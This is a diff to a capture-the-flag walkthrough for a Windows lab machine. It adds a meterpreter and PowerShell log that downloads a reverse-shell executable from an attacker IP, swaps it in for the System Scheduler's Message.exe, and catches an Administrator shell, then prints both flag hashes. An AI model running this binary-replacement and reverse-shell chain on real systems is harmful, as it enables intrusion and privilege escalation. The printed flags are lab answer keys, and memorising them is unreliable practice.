@@ -534,7 +534,7 @@ meterpreter >
 ```
 run simple server again use the shell.exe 
 meterpreter> shell
-c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://10.146.85.223:8000/winPEAS.bat' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
+c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://10.146.85.223:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
 
 or first run to get powershell prompt: 
 ```
@@ -545,6 +545,156 @@ meterpreter > powershell_shell
 Then enter powershell commands from powershell prompt, but here this is not easier.
 
 Next replace the message.exe file:
-rename message.exe message.bak
-rename shell.exe message.exe
+ren message.exe message.bak
+ren shell.exe message.exe
+
+
+```
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > cd "c:\program files (x86)\SystemScheduler\"
+PS > dir mes*
+
+
+    Directory: C:\program files (x86)\SystemScheduler
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---         3/25/2018  10:58 AM     536992 Message.exe
+
+PS > ren message.exe message.bak
+PS > dir mes*
+
+
+    Directory: C:\program files (x86)\SystemScheduler
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---         3/25/2018  10:58 AM     536992 message.bak
+
+PS > Invoke-WebRequest -Uri 'http://10.65.115.87:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\events\message.exe'
+PS > dir mes*
+
+
+    Directory: C:\program files (x86)\SystemScheduler
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---         3/25/2018  10:58 AM     536992 message.bak
+
+
+PS > Invoke-WebRequest -Uri 'http://10.65.115.87:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\message.exe'
+PS > dir mes* 
+
+
+    Directory: C:\program files (x86)\SystemScheduler
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---         3/25/2018  10:58 AM     536992 message.bak
+-a---         4/21/2026  11:57 AM      73802 message.exe
+
+
+PS > 
+```
+Now every 3 minutes message is run. So background the meterpreter session and back at metasploit prompt rerun the listener:
+```
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.65.115.87:4444 
+[*] Sending stage (177734 bytes) to 10.65.176.189
+[*] Meterpreter session 2 opened (10.65.115.87:4444 -> 10.65.176.189:49605) at 2026-04-21 20:08:03 +0100
+
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter > shell
+Process 1712 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\PROGRA~2\SYSTEM~1>whoami
+whoami
+
+C:\PROGRA~2\SYSTEM~1>echo %username%
+echo %username%
+Administrator
+
+C:\PROGRA~2\SYSTEM~1>c:\\
+```
+Move to jeffs Desktop to find flag
+```
+C:\PROGRA~2\SYSTEM~1>whoami
+whoami
+
+C:\PROGRA~2\SYSTEM~1>echo %username%
+echo %username%
+Administrator
+
+C:\PROGRA~2\SYSTEM~1>cd c:\users
+cd c:\users
+
+c:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of c:\Users
+
+08/04/2019  11:54 AM    <DIR>          .
+08/04/2019  11:54 AM    <DIR>          ..
+08/03/2019  11:15 AM    <DIR>          .NET v4.5
+08/03/2019  11:15 AM    <DIR>          .NET v4.5 Classic
+08/05/2019  02:03 PM    <DIR>          Administrator
+08/04/2019  11:54 AM    <DIR>          jeff
+08/22/2013  08:39 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               7 Dir(s)  38,985,801,728 bytes free
+
+c:\Users>cd jeff/Desktop
+cd jeff/Desktop
+
+c:\Users\jeff\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of c:\Users\jeff\Desktop
+
+08/04/2019  11:55 AM    <DIR>          .
+08/04/2019  11:55 AM    <DIR>          ..
+08/04/2019  11:57 AM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  38,985,801,728 bytes free
+
+c:\Users\jeff\Desktop>type user.txt
+type user.txt
+759bd8af507517bcfaede78a21a73e39
+c:\Users\jeff\Desktop>cd "c:\users\Administrator\Desktop"
+cd "c:\users\Administrator\Desktop"
+
+c:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of c:\Users\Administrator\Desktop
+
+08/04/2019  11:49 AM    <DIR>          .
+08/04/2019  11:49 AM    <DIR>          ..
+08/04/2019  11:51 AM                32 root.txt
+08/04/2019  04:36 AM             1,029 System Scheduler.lnk
+               2 File(s)          1,061 bytes
+               2 Dir(s)  38,985,801,728 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+7e13d97f05f7ceb9881a3eb3d78d3e72
+c:\Users\Administrator\Desktop>
+```
+```
 
